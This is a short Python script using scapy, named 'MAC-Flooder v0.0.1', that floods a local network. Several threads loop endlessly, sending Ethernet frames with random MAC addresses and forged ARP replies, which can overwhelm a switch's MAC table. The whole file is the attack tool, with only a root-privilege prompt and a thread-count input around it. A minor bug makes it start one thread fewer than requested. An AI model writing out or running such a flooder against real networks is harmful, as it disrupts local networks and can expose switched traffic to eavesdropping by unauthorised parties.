from scapy.all import *
from time import sleep
import random
import threading

threads = 4
answ = False
count = 0

def perform_query():
    while True:
        global count
        sendp(Ether(src=RandMAC(),dst=getRandomMAC())/ARP(op=2, psrc="0.0.0.0", hwdst=getRandomMAC())/Padding(load="X"*18), verbose=0)
        count = count + 1
        print(f"Sent packet: {count}")

def getRandomMAC():
    genIP = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
    return genIP

def flood(): 
    perform_query()

def startThreads():
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

print("MAC-Flooder v0.0.1 - by k1f0")
sleep(1)
print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
sleep(1)

userThreads = input(f"Specify Threads to use (def {threads}): ")

if userThreads == '':
    print(f"Using Default Threads count of {threads}")
    sleep(0.5)
else:
    print(f"Using Threads count of {userThreads}")
    threads = int(userThreads)
    sleep(0.5)

startThreads()